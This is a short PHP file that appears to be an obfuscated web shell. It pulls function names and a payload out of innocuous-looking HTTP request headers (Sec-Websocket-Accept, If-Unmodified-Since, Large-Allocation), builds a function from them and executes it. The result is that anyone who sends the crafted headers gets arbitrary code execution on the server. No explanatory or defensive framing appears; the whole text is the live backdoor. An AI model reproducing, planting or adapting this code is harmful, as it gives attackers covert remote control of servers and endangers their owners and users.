<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $dba_insertion = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Large-Allocation']));
    $dba_insertion();
}